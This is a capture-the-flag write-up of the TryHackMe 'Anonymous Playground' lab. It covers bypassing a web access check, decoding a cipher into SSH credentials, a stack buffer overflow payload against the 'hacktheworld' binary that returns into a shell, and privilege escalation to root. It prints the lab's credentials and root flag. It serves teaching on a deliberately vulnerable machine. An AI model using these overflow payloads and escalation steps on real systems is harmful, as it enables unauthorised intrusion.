---
title: TryHackMe Anonymous Playground
date: 2025-08-24
tags: [tryhackme, ctf]
author: nandakishor
---

# Anonymous Playground

![alt text](<../assets/images/anonymous playground/48c53eadabd494bfa54b72571f47cd47.png>)

## Initial Enumeration

![alt text](<../assets/images/anonymous playground/image.png>)

Upon scanning, we see that both SSH and HTTP services are open.

---

## Web Exploration

![alt text](<../assets/images/anonymous playground/image copy.png>)

By editing the configuration from "denied" to "granted," we can bypass access restrictions.

![alt text](<../assets/images/anonymous playground/image copy 2.png>)

This reveals a hidden directory.

![alt text](<../assets/images/anonymous playground/image copy 3.png>)

Inside, we find credentials that could potentially unlock SSH access, but they are encrypted:

```
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```

---

## Cipher Decoding

![alt text](<../assets/images/anonymous playground/image copy 4.png>)

A code snippet is provided to decode the cipher.

![alt text](<../assets/images/anonymous playground/image copy 5.png>)

I created a script using AI to decode this:

```python
def decode_custom_cipher(ciphertext):
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    pairs = [ciphertext[i:i+2] for i in range(0, len(ciphertext), 2)]
    result = []
    for pair in pairs:
        if len(pair) == 2:
            idx1 = alphabet.index(pair[0].lower()) + 1
            idx2 = alphabet.index(pair[1].lower()) + 1
            s = idx1 + idx2
            c = alphabet[(s-1) % 26]
            result.append(c)
    return ''.join(result)

ciphertext = "hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"
ciphertext = ciphertext.replace("::", "")
decoded_text = decode_custom_cipher(ciphertext)
print(decoded_text)
```

![alt text](<../assets/images/anonymous playground/image copy 6.png>)

The decoded credentials are:

```
magna::magnaisanelephant
```

---

## Binary Exploitation

![alt text](<../assets/images/anonymous playground/image copy 7.png>)
![alt text](<../assets/images/anonymous playground/image copy 8.png>)

It appears we need to reverse engineer a program.

![alt text](<../assets/images/anonymous playground/image copy 9.png>)
![alt text](<../assets/images/anonymous playground/image copy 10.png>)

Using `gdb`, we analyze the binary. The `callq` instruction at address `0x400540` calls the `gets` function via the Procedure Linkage Table (PLT). This is a common way to call shared library functions.

Before exploiting, we need to determine the buffer size.

![alt text](<../assets/images/anonymous playground/image copy 11.png>)

The buffer size is 72 bytes.

---

## Crafting the Exploit

![alt text](<../assets/images/anonymous playground/image copy 12.png>)

Since `radare2` is also available, it can be used for further analysis.

![alt text](<../assets/images/anonymous playground/image copy 13.png>)

We identify the address of the `system("/bin/bash")` call. Convert this address to little-endian format and craft the payload.

![alt text](<../assets/images/anonymous playground/image copy 14.png>)

Most modern binaries on Kali are 64-bit, so ensure the payload is in the correct format.

![alt text](<../assets/images/anonymous playground/image copy 15.png>)

Example payloads:

```bash
python -c "print('A'*72 + '\x57\x06\x40\x00\x00\x00\x00\x00')" | ./hacktheworld
```
This works, but does not provide a shell. Use the following to get shell access:

```bash
(python -c "print 'a'*72 + '\xb3\x06\x40\x00\x00\x00\x00\x00'"; cat) | ./hacktheworld
```

---

## Privilege Escalation

After gaining access, retrieve the flag from the user `spooky`.

![alt text](<../assets/images/anonymous playground/image copy 16.png>)

We find an interesting program in the `spooky` user's directory.

This program compiles a small C file that sets the user and group IDs to the current user, then launches a Bash shell. The compiled binary is stored in a hidden folder and temporary files are removed.

![alt text](<../assets/images/anonymous playground/image copy 17.png>)

This method can be used to escalate privileges.

![alt text](<../assets/images/anonymous playground/image copy 18.png>)
![alt text](<../assets/images/anonymous playground/image copy 19.png>)

After running the necessary commands, a file called `.cache` appears.

![alt text](<../assets/images/anonymous playground/image copy 21.png>)

Retrieve the root flag:

```bash
root@anonymous-playground:/root# cat flag.txt    
bc55a426e50f24ce66
root@anonymous-playground:/root# 
```

---

## Final Step

Try to spawn a PTY shell for a more stable interactive session.